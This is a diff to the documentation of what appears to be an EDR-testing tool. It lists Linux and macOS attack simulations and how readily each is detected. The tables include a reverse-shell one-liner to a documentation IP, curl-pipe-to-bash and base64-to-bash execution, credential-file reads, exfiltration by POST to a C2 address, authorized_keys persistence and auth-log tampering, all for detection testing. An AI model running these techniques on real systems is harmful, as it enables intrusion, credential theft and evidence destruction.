@@ -194,11 +194,11 @@ so they are easy to filter in a SIEM or log file.
 
 | Simulation | Technique |
 |---|---|
-| Bash recon chain | 9-command recon chain via `bash -c` — creates suspicious `python→bash→tools` process tree |
-| Bash encoded command | `bash -c "$(echo <base64> \| base64 -d)"` — Linux obfuscation equivalent |
-| curl\|bash cradle | `curl URL \| bash` — the single most-flagged Linux download-and-exec pattern |
+| Bash recon chain | `bash -c` chain including `/etc/shadow`, `/root`, `~/.ssh` attempts — creates suspicious `python→bash→tools` process tree |
+| Bash encoded command | base64-encoded payload with credential access commands — `base64 -d \| bash` |
+| curl\|bash cradle | Writes a shell script to `/tmp`, then `curl file:// \| bash` — real shell execution through the pipe (not JSON) |
 | curl/wget download cradle | Downloads from a safe echo endpoint to simulate payload retrieval |
-| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444 0>&1` — most common post-exploitation technique, heavily signatured |
+| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444` then Python socket fallback for systems without bash /dev/tcp |
 | /etc/shadow read | Actually `open()`s `/etc/shadow` — generates credential-access telemetry |
 | SUID binary search | `find /usr -perm -4000` — standard privilege escalation recon |
 | sudo recon | `sudo -l` / `cat /etc/sudoers` — first-step privilege enumeration after shell access |
@@ -208,6 +208,10 @@ so they are easy to filter in a SIEM or log file.
 | Directory traversal | Lists `/etc`, `/var/log`, `/root`, `~/.ssh`, `/tmp` |
 | /proc access | Opens `/proc/1/maps`, `/proc/1/cmdline`, `/proc/1/environ` — memory recon pattern |
 | nmap subnet scan | Runs `nmap --top-ports 20` against local /24 — uses the actual binary, much more detectable than raw sockets |
+| Hidden payload exec | Writes a dotfile executable to `/tmp`, `chmod +x`, executes it — classic malware drop pattern |
+| Credential exfil simulation | Read `/etc/passwd` + `/etc/shadow` attempt + `~/.ssh/id_rsa`, base64-encode, POST to RFC 5737 C2 IP — combined file+network signal |
+| SSH key persistence | Appends a test key to `~/.ssh/authorized_keys`, waits 2s, removes it |
+| Anti-forensics (log tamper) | Attempts to truncate `/var/log/auth.log` and `/var/log/secure`, then clears bash/zsh history |
 | rpm -Va integrity check | Verifies package file integrity — used to find tampered binaries |
 | yum/dnf package recon | Lists all installed packages via yum or dnf |
 
@@ -224,15 +228,19 @@ Same as RHEL, plus:
 
 | Simulation | Technique |
 |---|---|
-| Bash recon chain | Multi-command recon via `bash -c` intermediary |
-| Bash encoded command | Same base64 decode+exec technique as Linux |
-| curl\|bash cradle | `curl URL \| bash` — top-flagged download-and-exec pattern |
+| Bash recon chain | `bash -c` chain with credential access attempts |
+| Bash encoded command | base64-encoded payload with credential access — `base64 -d \| bash` |
+| curl\|bash cradle | `curl file:// \| bash` — real shell execution through the pipe |
 | curl download cradle | Simulates payload retrieval |
-| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444 0>&1` |
+| Reverse shell simulation | `bash /dev/tcp` then Python socket fallback |
 | SUID binary search | Scans `/usr` for setuid binaries |
 | sudo recon | `sudo -l` / `cat /etc/sudoers` |
 | nmap subnet scan | Runs `nmap --top-ports 20` against local /24 |
 | Directory traversal | Lists sensitive directories |
+| Hidden payload exec | Dotfile executable in `/tmp`, chmod+x, execute |
+| Credential exfil simulation | Read credential files, base64, POST to C2 IP |
+| SSH key persistence | Write/remove test key in `~/.ssh/authorized_keys` |
+| Anti-forensics | Truncate auth logs, wipe bash/zsh history |
 | Keychain access | `security list-keychains` and `find-generic-password` |
 | LaunchAgent persistence | Writes and loads a test `.plist`, then immediately unloads and deletes it |
 | macOS-specific recon | `dscl`, `networksetup`, `system_profiler`, `defaults read` |
@@ -414,6 +422,10 @@ expected behaviour on default EDR policies — tuned environments will catch mor
 | nmap subnet scan | Medium | **Only fires if nmap is installed** — not present by default on CentOS; install with `sudo dnf install nmap` |
 | `/proc/1` access | Medium | Requires file-access monitoring |
 | sudo recon | Low–Medium | Low signal alone; stronger in combination |
+| Hidden payload exec | High | Dotfile drop + chmod+x + exec is a classic malware IOA |
+| Credential exfil simulation | High | Combined file-read + outbound POST = multi-stage chain |
+| SSH key persistence | High | Writing to authorized_keys is a first-class persistence IOA |
+| Anti-forensics (log tamper) | High | Log truncation + history wipe = strong post-compromise indicator |
 
 ### Kali / Debian / Ubuntu
 
